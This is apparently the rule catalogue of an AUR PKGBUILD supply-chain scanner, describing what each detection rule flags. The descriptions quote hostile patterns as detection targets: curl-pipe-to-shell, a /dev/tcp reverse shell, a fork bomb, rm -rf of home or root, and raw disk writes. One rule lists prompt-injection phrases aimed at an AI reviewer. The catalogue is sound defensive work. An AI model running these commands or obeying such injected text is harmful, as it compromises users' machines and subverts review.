h082.description: The **unattributed arm** covers the clients whose output grammar names no file: `sftp`/`ftp`/`ssh`/`nc`, `git fetch`/`pull`, `rclone moveto`/`move`/`bisync`/`copyurl`, `ipfs get`, `aws s3 cp`, `gsutil cp`, `b2 download`, `cvs`, `tftp`, `openssl s_client`, `npx`, a glued or server-decided flag, and a fetch-spec-in-file (`wget -i`, `aria2c -i`, `lftp -f`, `curl --config`). A later execution of an undeclared, non-benign file in the same reachable scope pairs with it; pairing crosses makepkg phases in order (`prepare` -> `build` -> `check` -> `package`), treats a loop variable (`bash "$f"`) as an unknown path, and follows a rename of a fetched file (`awk '1' repo/x.sh > run.me; escript run.me`). Executions under `$pkgdir` are the package's own output and are exempt. A scheme-bearing URL is left to H016 and the attributed arm, so one command is not scored twice.

h083.name: Downloaded Source File Executed
h083.description: Checksums protect integrity, not intent: a `source=(... stage.sh)` followed by `bash "$srcdir/stage.sh"` is remote code execution just like `curl | bash`, only hidden behind the ordinary download path. The name does not matter: a downloaded `configure`, `make` or `Makefile` executed as a script fires too. `url=` is attacker-declared, so a host that matches it is not provenance, and a `name::url` rename that ships a payload under a benign name fires for the same reason. Detected by `edge_source_file_execution()` in `src/trustsight/analysis/delivery.py`.

h084.name: Service ExecStart Targets Undeclared Binary
h084.description: Service units are read from the tree manifest when one is supplied, and from added diff lines otherwise (a whole service file in the diff, parsed by heuristic). The installed executable must come from an `install` with an explicit `7xx` mode or no `-m` flag (install's default is 755). Such files arrive through the unseen source tarball, so their content cannot be audited. Detected by `_service_binary_findings()` in `src/trustsight/analysis/delivery.py`.

h085.name: PATH Injection With Undeclared Directory
h085.description: `PATH=$srcdir/tools:$PATH make` lets the recipe smuggle a binary into a standard command's search path. Adding the plain source root is common enough that it stays silent; deeper paths are more likely to be legitimate project layouts, so only single-level subdirectories are flagged. Detected by `_path_injection_findings()` in `src/trustsight/analysis/delivery.py`.

h086.name: Adopted From Orphan
h086.description: This is H074's property on the **single-package path**. H045, H046, H057, H060 and H074 all describe adoption, and every one of them needs a `full-aur` cycle: somebody running `trustsight review` over their installed packages saw none of them, and those are the people the June 2026 campaign hit. H086 needs only the AUR metadata the review path already fetches.

h087.name: Recipe Changed Without Upstream
h087.description: The June 2026 AUR campaign did not touch the upstream software. It edited the build recipe and nothing else, so a reviewer reading source URLs and checksums - the fields that usually carry a supply-chain change - saw a package whose upstream was provably identical to the version they already trusted.

h088.name: Adopted, Recipe Rewritten, Unpinned Fetch
h088.description: This is the June 2026 campaign's chain in one rule, and it exists because none of its three members can carry the weight alone.

h089.name: Packaged File Names A Build-Only Path
h089.description: The audit's largest silent family is a configuration file the recipe *generates* into the package root whose exec slot names a script: an i3 `bindsym … exec`, a polybar `exec =`, a udev `RUN+=`, an acme `RELOADCMD=`, a mutt `macro … !bash`. Every rule that looks for execution reads the recipe's own commands, and none of these lines is a command the recipe runs - they are text, and what runs them is the user's session, later, on a different machine.

h090.name: Committed Companion Carries A Fetch-Execute Payload
h090.description: A `.service` whose `ExecStart=` pipes a download into a shell is the payload, and until now nothing read it. The diff shows the recipe staging the file, which is ordinary packaging and scored as such; the bytes that matter live in a file the diff does not touch.

h091.name: Checksum Array Shorter Than Source Array
h091.description: makepkg pairs `source=()` with each `*sums=()` by position, and no rule looked at the two lengths together. A source slipped in beside a checksum list nobody recounted scored nothing but priors - the array declares verification for the entries it covers and says nothing about the one added past its end.

h092.name: Metadata Names A Source The Recipe Does Not
h092.description: `.SRCINFO` is *generated from* the PKGBUILD, and the analysis prefers it wherever it is richer - structured `depends`, expanded sources. That preference is trust, and nothing compared the two. A `.SRCINFO` naming a source the recipe does not was simply believed, and an AUR helper resolving dependencies from the metadata while makepkg builds from the recipe are reading two different descriptions of the same package.

h093.name: Committed Config Points At A Build-Only Path
h093.description: The symmetric half of [H089](#h089). That rule reads content the recipe *generates* into `$pkgdir`; this one reads content the recipe *committed* and then ships. The observable is identical and so is the reasoning: those directories exist only while the package is being built, so a shipped file naming one is either broken on arrival or aimed at a directory whoever wrote it expects to control when it is read.

h094.name: Unread Script Executed During Packaging
h094.description: `package()` stages files into `$pkgdir`. It is not where software gets built, and its output *is* the package. Running an unaudited script there is a different act from running one in `build()`.

h095.name: Boot Or Image Artifact Built From The Source Tree
h095.description: `dracut --include "$srcdir/x" /x` injects a path from the build tree into the initramfs, which runs before userspace exists and before any filesystem the user can inspect is mounted. `grub-mkconfig` writes the boot menu. `guestfish` and `virt-customize` edit a disk image's contents.

h096.name: Download Agent Override
h096.description: `DLAGENTS` controls how makepkg fetches sources for each protocol. Overriding it in a PKGBUILD redirects all source downloads through the attacker's chosen binary. Any change to DLAGENTS is flagged: legitimate recipes do not modify it.

h097.name: Function Shadowing
h097.description: Redefining `msg()`, `error()`, or `die()` suppresses build output. Redefining `cd()` hijacks the working directory. Redefining `.()` redirects file inclusion. No benign PKGBUILD does any of these.

h099.name: Source Host Swapped Under A Kept Local Name
h099.description: makepkg's source cache keys on the local name (the `name::url` rename, or the URL's basename), so swapping the server under a kept name refetches nothing and shows a reviewer a familiar filename: the quiet swap. The comparison is by registered domain, so a move between subdomains or CDNs of the same registrable domain (`cdn.example.org` to `dl.example.org`) is not a swap. A version bump suppresses the rule: a new release moving to a new host is the ordinary shape of an upstream that relocated, and C003 already records the URL change there.

h100.name: Install Hook Added Or Retargeted
h100.description: A `.install` hook runs as root on the installer's machine. H017 inspects hook *content*; nothing watched the declaration itself, so a package that never had a hook could gain one without a finding. The two severities separate the shapes: a hook script arriving in the same diff as its declaration is the attack's committed form, while a declaration moving to an existing script is weaker (the script may predate the diff) and reads as MEDIUM.

h101.name: Source Pinning Lost
h101.description: P008 reports a floating source wherever one stands; H101 catches the *moment* a verifiable package becomes upstream-controlled, which in a watch replay is the signal that matters: the package that was pinned yesterday and tracks a branch today changed who decides what it builds. Only same-name entries on both sides of the diff compare, the H099 keying, so a partially shown array cannot mis-pair an entry.

h102.name: Maintainer Change With Signing Key Change
h102.description: The xz shape: a new maintainer plus a keyring change means the person now able to sign the sources is not the person the keyring was built for. Each fact scores on its own (H078, the maintainer tier); the conjunction is the attack, so it stacks the way X007 stacks its members. H078's own detection stands in for the keyring delta, the same member-rule composition H098 uses.

h103.name: Metadata And Recipe Disagree
h103.description: H092 compares the hosts the two documents name. This rule compares the fields that decide what the build installs, fetches and verifies: a metadata file that names a different install hook, a different set of checksums, or a different dependency list describes a build other than the one makepkg will run, and an AUR helper reading the metadata may resolve a different closure than the recipe builds.

m001.name: Claim Contradicted By Structure
m001.description: It joins the *real* claims ledger - the P-series ids the run's declared facts imply (`trustsight.scoring.declared_claims`) - against the structural findings: checksums declared (P001) while H091 reports the arrays do not cover every source, GPG verification declared (P002) while H024 reports it removed, a source pinned (P005) while H101 reports the pinning lost, a trusted forge declared (P007) while H099 reports the host swapped.

m002.name: Weak Signal Across Layers
m002.description: An attacker who spreads weak signals across layers stays under any single threshold; the span is only visible from the whole profile. It adds no points but raises the reported band one step: a spread across layers is exactly the case a single-signal threshold cannot see. Measured on the locked benign corpus: 112/3,739 (3.0%).

m003.name: Composition Not Owned Elsewhere
m003.description: The composition is never lost. It adds no points but raises the reported band one step. Measured on the locked benign corpus: 316/3,739 (8.5%).

m004.name: Expected Co-fire Absent
m004.description: A construct that historically co-fires with another rule appeared without it. A hit means the **tool**, not the package, needs attention, so this is never added to a package's finding list: it rides the report's `cofire_health` channel for the harness and calibration.

m005.name: Licensor Absent On Licensed Shape
m005.description: A rule declaring `escalates_when` fired while none of its declared licensors did - the detector travelled without its usual company. Like M004 this is a sensor-health observation, not evidence about the package, so it goes to the `cofire_health` channel and never scores. See [Escalation Licensing](../../explanation/escalation-licensing.md).

m006.name: Campaign Re-armed Too Often
m006.description: A campaign re-armed faster than `[alerts] campaign_min_reactivation_observations` allows. The window is still refreshed - re-activation is never blocked - but a campaign that re-primes over and over is the **instrument** churning, not a package misbehaving, so it is surfaced as a tool-health note rather than passed over in silence. Unlike M004 and M005 it is a cycle-level observation: it is raised in the correlation cycle's log, not attached to any package's `cofire_health`, and it never scores. See [Campaign Alert Mode](../../explanation/campaign-alert-mode.md).

novelty.name: Novelty Signal
novelty.description: A source URL or maintainer this package has never been seen with before (or that the whole seed has never seen). The weight is scaled by how much history the local database holds, so a cold database trusts the signal less. It is context, not a verdict.

p001.name: Checksums Declared
p001.description: The recipe declares checksums for every non-VCS source. Reported, never credited: a claim an attacker can assert for free must not move the score.

p002.name: validpgpkeys Declared
p002.description: The recipe declares validpgpkeys. TrustSight does not verify the keys sign anything; it reports that the recipe claims them.

p003.name: Signature Source
p003.description: A signature source accompanies a source and PGP keys are declared. The signature is declared, not verified by TrustSight.

p005.name: Commit Pinned
p005.description: A source is pinned to a full commit hash. Reported as a declared fact; TrustSight does not fetch the commit to confirm what it holds.

p006.name: Tag Pinned
p006.description: A source is pinned to a tag (tags can be repointed; commit pins cannot). Weaker than a commit pin and reported as such.

p007.name: Trusted Forge
p007.description: A source is hosted on a trusted forge over HTTPS. A declared property of the URL, not a verification of the content.

p008.name: No Commit Pin
p008.description: A source tracks a branch or unpinned ref; upstream decides at build time what this compiles and runs. Stated so its absence is not mistaken for a pin.

r001.name: Remote Script Execution
r001.description: Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.

r002.name: Wget Pipe to Shell
r002.description: Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.

r003.name: Base64 Decode and Execute
r003.description: Detects `base64 -d |` and `base64 --decode |` piped to execution. Base64-encoded scripts are a common obfuscation technique to hide malicious commands from casual review.

r007.name: Install File Modification
r007.description: Fires when a `.install` file is added or modified in the diff. Install scripts run with root privileges and are a common vector for persistent backdoors.

r008.name: Unexpected File Download
r008.description: Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.

r010.name: Uses curl in PKGBUILD
r010.description: Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.

r011.name: Uses wget in PKGBUILD
r011.description: Same rationale as R010 but for `wget`. Separate rule per tool.

r012.name: LLM Prompt Injection
r012.description: Detects template-shaped text addressed to whoever *reads* the PKGBUILD rather than to the shell that runs it: instruction overrides ("ignore the previous instructions"), role markers (`system:`, `assistant:`), tag-like injections (`<system>`, `<instructions>`), personas ("you are a helpful model..."), suppression orders ("do not flag/warn/analyze") and pre-declared verdicts ("mark this as safe"). Comment lines are scanned, unlike every rule that describes what the shell executes, because this is reviewer-facing text. Calibrated at 22/22 labelled injection fixtures with 0 fires across the historical 3,739-diff benign corpus. This is a **reviewer-directed template tripwire**, not proof of an author's intent or a general prompt-injection detector: a match requires reviewer scrutiny, and a non-match establishes nothing. The finding contributes weight 0; its signal is the unsuppressible FATAL entry in `score_breakdown` and the FATAL name in the verdict label.

r013.name: Unicode Bidi Override
r013.description: Detects directionality overrides, isolates, invisible operators, tag characters, and zero-width joiners placed between ASCII neighbours. These codepoints can make displayed text differ from executed text. The ASCII-neighbour restriction preserves attacks hidden inside ASCII commands or URLs while dropping legitimate use in localized `GenericName[...]` lines.

r017.name: Setuid/Setgid Permission
r017.description: Detects symbolic `chmod ... +s` commands that set a setuid or setgid bit. A setuid binary runs with its owner's privileges, the shape of many local-privilege-escalation backdoors. R053 and R059 own the target-specific symbolic and octal forms, so R017 defers to them rather than scoring one command twice.

r039.name: Eval With Dynamic Content
r039.description: Detects `eval` applied to a variable, command substitution, or backtick expression. The payload is assembled at runtime, so no static pattern can see what will execute.

r040.name: Shell -c With Dynamic Payload
r040.description: Detects `sh -c` / `bash -c` whose argument contains a variable or substitution rather than a literal command.

r041.name: Shell Network Redirection
r041.description: Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.

r042.name: Download Then Execute
r042.description: Detects the download-then-run chain: fetch to a path, optionally `chmod +x`, then execute it. Each step alone is unremarkable; the sequence is not.

r043.name: Base64 Blob Decode
r043.description: Detects `base64 -d` fed from a here-string or a variable, as opposed to decoding a file that is itself part of the source array.

r044.name: Interpreter One-Liner With Network
r044.description: Detects an interpreter one-liner (`-e`) that references network APIs (`socket`, `urllib`, `LWP`, `Net::`) or an inline URL.

r045.name: Binary Encoding Pipe
r045.description: Detects `xxd` or `uudecode` piped onward. Both reconstruct binary content from a text representation, a way to carry a payload past text review.

r046.name: Source URL Uses IP Address
r046.description: A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply. Loopback and private addresses are excluded: they distribute nothing, so a local URL a recipe only prints is not a source. A line that only prints text (`echo`/`printf`/`cat`) is excluded for the same reason.

r047.name: Source URL Uses Non-Standard Port
r047.description: A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host. Loopback and private addresses, and lines that only print text, are excluded, as for R046.

r048.name: Source URL On Free Registrar TLD
r048.description: A source URL on a free-registrar TLD (`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.pw`). These carry no registration cost and are disproportionately used for throwaway infrastructure. Deliberately excludes `.xyz` and `.top`, which have substantial legitimate use.

r049.name: Compiler Plugin Or Loader Override
r049.description: `-fplugin=` loads an arbitrary shared object into the compiler; `-Wl,--dynamic-linker=` changes which loader the produced binary uses. Both alter the build without touching any source file.

r050.name: Compiler Hardening Disabled
r050.description: Detects removal of stack-protector or NX protections from the build flags.

r051.name: Network Access In pkgver
r051.description: `pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.

r052.name: Dotfile Written To User Profile
r052.description: Detects writes to a dotfile under `$HOME`, `~`, `/root`, or `/home/<user>`, the shape of shell-profile persistence. Dotfiles written inside `$pkgdir` (such as `/etc/skel` templates) are ordinary packaging and do not match.

r053.name: Setuid Or Setgid Bit Set In Package Root
r053.description: Setuid or setgid applied to a path being staged into the package. Detects both octal (`4755`, `2755`) and symbolic (`u+s`) forms, on `chmod` and on `install -m`; ordinary modes such as `644`, `755` and `+x` do not match. Chromium's sandbox helper legitimately requires `4755`, so this fires on essentially every Electron package. Measured across the benign corpus, MEDIUM changes **no** package's risk band; the evidence stays visible in the tiered breakdown without reclassifying routine updates. At HIGH it would have reclassified every Electron package as Medium.

r054.name: Persistence Unit Outside Package Root
r054.description: Detects a cron job or systemd unit written to a system path. A unit staged into `$pkgdir` is flagged too, in any quoting style (`"${pkgdir}"/usr/lib/...`, `"${pkgdir}/usr/lib/..."`, `$pkgdir/usr/lib/...`): pacman installs what the recipe staged, so all three produce the same persistent root-level unit. Writing to the live filesystem during a build is the worse case of the same finding.

r055.name: Git Clone With Variable Branch
r055.description: A `git clone --branch $var` resolves at build time to whatever the variable holds, so the pinned ref is not actually pinned.

r056.name: Download Then Source
r056.description: Detects a download followed by `source` or `.`, which executes the fetched file in the current shell.

r057.name: TLS Verification Disabled
r057.description: Detects the documented TLS-off flag of every catalogued client: `curl --insecure`/`-k`, `wget --no-check-certificate`, `git -c http.sslVerify=false`, `pip --trusted-host`, `npm --strict-ssl=false` and `deno --unsafely-ignore-certificate-errors`, plus the `GIT_SSL_NO_VERIFY` and `NODE_TLS_REJECT_UNAUTHORIZED=0` environment assignments. Disabling certificate verification makes the transport trivially interceptable. The `-k` match requires a preceding word boundary so that flags such as `--keepalive-time` do not trigger it. `--no-verify` is deliberately absent: for bun and cargo it skips lifecycle scripts, not TLS; bun/node disable TLS through the Node compatibility variable instead, and cargo's transport is git (`http.sslVerify`), already covered.

r058.name: Write Outside Package Root
r058.description: Detects writes to `/etc`, `/boot`, `/usr/bin`, or `/usr/lib` by absolute path. The same write prefixed with `$pkgdir` is normal packaging and does not match.

r059.name: Setuid Or Setgid Bit Set Outside Package Root
r059.description: The same operation against an absolute path. This touches the live filesystem rather than `$pkgdir`, so it is a privilege change on the build host and not packaging. Split from R053 because the two are materially different: `chmod u+s "$pkgdir/opt/x/chrome-sandbox"` is ordinary Electron packaging, while `chmod u+s "/usr/bin/helper"` is not.

r078.name: Compression Command Override
r078.description: These variables control makepkg's archive compression command. Overriding them can pipe decompressed content through an arbitrary binary. Legitimate uses are rare (custom compression tuning for size/performance).

r091.name: Privilege Escalation Override
r091.description: This variable controls how pacman gains elevated privileges during `makepkg -S`. Overriding it in a PKGBUILD means the package is trying to control privilege escalation on the builder's machine.

r099.name: Trap Statement
r099.description: `trap` registers signal handlers. In a PKGBUILD it can suppress errors (`trap '' ERR`), run code on build completion (`trap 'payload' EXIT`), or perform legitimate cleanup. Legitimate cleanup traps exist but are uncommon enough to flag.

r104.name: Error Handling Suppressed
r104.description: Suppresses error handling (`ERR`) or trace output (`DEBUG`), hiding build failures from the reviewer. These are subsets of R099 but carry higher severity because they actively conceal activity. Only the single-quote form is common; the double-quote form is rare and already caught by R099.

r144.name: Packaged File Points At A World-Writable Path
r144.description: A file staged into the package root names a program under a world-writable directory. Anyone can replace the target after the package is built, so the installed path is not under the packager's control.

r152.name: Source URL On Free-Hosting Or Dynamic-DNS Host
r152.description: A source URL hosted on a free-hosting, dynamic-DNS or tunnelling provider. Naming one of these costs nothing and leaving it costs nothing, so a source served from here is a claim a reviewer has to judge rather than an upstream distribution channel. The list is split into dynamic DNS (`duckdns.org`, `no-ip.org`, ...), tunnels (`ngrok-free.app`, `trycloudflare.com`, ...) and free/static hosting (`pages.dev`, `github.io`, `vercel.app`, ...). The free-hosting group is the tunable one: small projects do occasionally publish release assets there, so it is the first thing to trim in `hosts.toml free_hosting_domains` if it misfires. The leading `\.` makes this a subdomain match, so `duckdns.org.evil.com` does not fire.

s001.name: Recursive Self-Spawn
s001.description: The classic `:(){ :|:& };:` and its named variants. Detected structurally rather than by literal: the pattern is a back-reference, so `bomb() { bomb | bomb & }; bomb` matches for the same reason the `:` form does, and renaming the function buys nothing.

s002.name: Recursive Deletion Outside The Build Tree
s002.description: The conjunction is the rule. `rm -rf` alone is housekeeping; a target of `/`, `/*`, `/etc`, `/usr`, `/var`, `/boot`, `/home`, `/root`, `~` or `$HOME` is not. A `rm` whose target is `$srcdir` or `$pkgdir` is exempt, because a recursive delete inside the build tree is what makepkg expects; the exemption is per command, so a benign sandbox delete on a line no longer masks a following `rm -rf ~`.

s003.name: Raw Block Device Write
s003.description: Nothing a package build legitimately does writes to `/dev/sda`. `dd` writing to a *file* is ordinary (generating test data, padding an image) and does not fire; only a device target does.

s004.name: Secure Deletion Of User Data
s004.description: Separated from S002 because unrecoverable deletion is a different claim from deletion: `rm` leaves data recoverable in principle and `shred` does not, so the response differs even though the intent looks the same.

s005.name: Permission Change On A System Path
s005.description: World-writable system directories are a privilege-escalation primitive left behind for later rather than an attack that completes now, which is why this is HIGH rather than CRITICAL. `chmod 777 "$pkgdir/var/run"` is sloppy packaging, not this rule's business.

s006.name: System Service Disruption
s006.description: The unit list is the whole precision of this rule. A package stopping or disabling **its own** service is standard packaging - you stop a daemon before replacing its binary and disable it on removal - and four diffs in the locked benign corpus do exactly that (`systemctl disable input-remapper`, `systemctl disable --now mullvad-daemon`). Without the list, a rule on the verbs alone flags every one of them.

s007.name: Cryptocurrency Miner
s007.description: Resource theft rather than damage, and the reason the family is called sabotage: nothing is destroyed, the machine is simply working for someone else. The pool URL and `--donate-level` are matched anywhere on the line rather than in command position, because writing a pool URL into a config file is how a miner is installed, not how one is mentioned.

s008.name: Shell History Or Log Destruction
s008.description: Anti-forensics, and MEDIUM because on its own it is weak evidence: a misguided recipe might clear history for tidiness. Its value is compositional - erasing the record of what ran is a strong signal *beside* something that ran, and H027 counts capability spread across families.

source_bucket.name: Source Provenance
source_bucket.description: A source URL was classified into a trust bucket (trusted forge, official, raw hosting, unknown or homograph). Only the least trusted added URL contributes, and the contribution is a property of the source list, not of each URL in it.

t001.name: Signing-Key Novelty
t001.description: This is distinct from package novelty: the xz lesson is a *key* story. A key that has signed nothing else in the ecosystem, appearing on this package, is worth a high-weight flag even when the package itself is old.

t002.name: Maintainer Domain Novelty
t002.description: A first-seen domain is a weak but real signal about a maintainer with no prior footprint. Cold index declines, like T001.

t003.name: Signing Key Rotated
t003.description: The xz backdoor's shape: the trusted signer is swapped, not merely widened (H078) or narrowed (H024). Unlike T001 it needs no ecosystem history - the rotation of trust inside one commit is its own fact - so it fires cold.

t006.name: Metadata-Git Divergence
t006.description: In aurweb, pushes set both `LastModified` and the git commit timestamp, so divergence means commits were pushed and later stripped (a history rewrite). The benign explanations (staff reset, maintainer cleanup force-push) are themselves security-relevant, so this is MEDIUM, review-queue verdict. The finding's output is designed to be pasted into a report to AUR security, where push logs survive even when git history does not.

t007.name: Packager Not In History
t007.description: A weight-0 corroboration signal: the AUR says this account packaged the project, but no commit in history mentions them. Name matching is fuzzy (display name vs email vs git config), so this corroborates T006 and G008 but never scores alone. On its own tier it is nearly a confession; as a solo scorer it would eventually burn someone with an unusual committer setup.

u001.name: Manifest Added Or Removed
u001.description: Ledger only. A new or removed manifest changes what the committed dependency surface is, but its mere presence is not a claim about intent.

u002.name: Upstream Dependency Delta
u002.description: A declared-surface ledger entry, presented with its own group and the "TrustSight does not verify these" line: it reports the names the committed manifest added or removed, never scores them (B10). Lockfile churn is reported as counts and named top-level dependencies, not a full delta.

u003.name: New Remote Source In Manifest
u003.description: The scored core. The gained hosts are run through the same host canonicalization as a `source=()` URL and join the run's `hosts_gained` view, so host-novelty tiers, source buckets and the G-series treat a manifest-introduced host exactly like a declared one. The claim is precise: "the build will now fetch from a host the recipe did not declare."

u004.name: Registry Redirect
u004.description: A redirected resolver sends every dependency the build installs somewhere other than the default registry, which is the destination a reviewer has no other way to see.

u005.name: Dependency Surface Jump
u005.description: Ledger only, and its primary consumer is the correlation feed: a dependency surface that multiplies in one update is a campaign shape the G-series joins across packages, not a per-package verdict.

u006.name: Manifest Changed Without Its Lockfile
u006.description: A real integrity signal (spec section 7.2): the resolved dependency set is not committed alongside the declaration, so what the build will actually fetch is unstated. It stays **weight 0** because VCS and library packaging legitimately omit lockfiles - the corpus must adjudicate a scored rate before it can be promoted.

w001.name: Executes Code This Analysis Did Not Read
w001.description: Fires when a build function runs a script - through an interpreter, or as `./name` - whose path is neither declared in `source=()` nor committed to the repository.

w002.name: Build Resolves Dependencies From A Registry
w002.description: Fires on a build step that resolves packages from a language registry: `npm install`, `pip install -r`, `cargo fetch`, `go mod download` and siblings.

w003.name: Applies A Patch This Analysis Did Not Read
w003.description: Fires on `patch` or `git apply` naming a `.patch`/`.diff` that is not committed to the repository.

w004.name: Build Engine Runs A Manifest This Analysis Did Not Read
w004.description: Fires when `make`, `ninja`, `bazel`, `scons` or a sibling is given an explicit manifest argument that is neither declared nor committed.

w005.name: Build Runs A Target Whose Recipe Was Not Read
w005.description: Fires when `make` or `ninja` is given a non-standard target and no `Makefile` is committed.

w006.name: Generated File Names A Build-Only Path
w006.description: Fires when a `printf`/`echo`/`cat`/`tee` writes a file outside `$pkgdir` whose content names `$srcdir`, `$startdir`, `$PWD` or `$BUILDDIR` in a field that is not merely descriptive.

w007.name: Dependency Novelty Declined For Insufficient Observations
w007.description: Fires when D001/D002 would have judged an added dependency but abstained because the dependency corpus holds no observations. Without the corpus guard every name looks novel and D001 fires on every package a fresh install sees, so the rules stand down - and the stand-down is reported rather than left as silence.

w008.name: Unresolved Construct In A Recipe
w008.description: Fires when the tokenizer could not resolve one or more assignments in the recipe (a computed `source=()`, a build-time value). An unresolved construct is an analysis boundary: the reader is told what the analysis could not resolve. It is the W-series face of the same fact the refusal rules X026 (X026 fires on an unresolved construct referenced from an executable function, scored) report as a suspicion - [X026 and X027 may fire on the same diff](crossfire.md#x026), weight-0 vs scored.

w009.name: Upstream Manifests Not Examined
w009.description: Fires when a committed dependency manifest could not be parsed (malformed, or over the byte cap), or when the recipe declares a source archive whose listing contains a known manifest filename. The second shape is a standing boundary, not a per-diff gap: the analysis never fetches and never extracts (A2, A8), so the manifests inside an upstream archive are outside what any run can read by design.

w010.name: Alert Volume Capped
w010.description: Fires when a run produces more findings than `[alerts] max_rendered_findings` (default 50) and the terminal therefore groups the remainder. The per-band counts travel with it, so grouping is reported rather than silent; the JSON report is never filtered and carries every finding.

x001.name: Encoded Payload Decoded And Executed
x001.description: Fires when an encoded blob is decoded and the result reaches a shell or interpreter inside an executing scope. Covers hex and octal escapes, reversed hex dumps (`xxd -r`, `od -An`, `hexdump`), non-base64 decoders (`base32 -d`, `basenc`, `openssl enc -d`, `uudecode`), ANSI-C `$'...'` blobs, and `tr` rotations.

x002.name: Non-Literal Executable Name
x002.description: Fires when the word in command position is not a literal. Recognised shapes:

x003.name: Obfuscated Command Argument
x003.description: Fires on a `curl`/`wget` long option truncated to a unique prefix (`--upload-f`), a shell invoked with options stuffed around `-c` (`bash -lc`, `sh -ec`, `sh -ce`), or a URL whose host is an octal, hex or integer-encoded IP.

x004.name: Build Output Suppressed
x004.description: Fires on `TERM=dumb` (quoted or not), `set +x` in any letter order, `set +o xtrace`, or a redirection that detaches a stream (`exec >/dev/null`, `exec 2>>/dev/null`, `exec &>/dev/null`, `exec 2>&-`) inside an executing scope.

x005.name: Home Reached By An Alternative Spelling
x005.description: Fires when a write or redirect reaches a home directory by a spelling [H032](install-and-persist.md#h032) does not match: `/home/alice`, `/home/$USER/...`, `~alice`, `/root`, `${HOME:-/home/alice}/...`, or a traversal naming `home` or `root`. The trailing separator is optional.

x006.name: Source Points Somewhere Unexpected
x006.description: Fires on a URL shortener or a raw-IP URL anywhere in the diff. Neither is legitimate in a `source=` array: a shortener hides the destination from the reader, and a raw IP has no name to check.

x007.name: Multiple Evasion Techniques
x007.description: Fires when two or more distinct crossfire techniques appear in one diff. One technique can be an accident of style; two is a method.

x008.name: Whitespace A Shell Does Not Split On
x008.description: Fires on a whitespace character other than space, tab, newline or carriage return, on an executing line of a shell file.

x009.name: Fetch Through An Uncatalogued Client
x009.description: Fires when a network client other than `curl`/`wget` feeds a shell or interpreter on an executing line.

x010.name: Interpreter One-Liner Reaches The Network
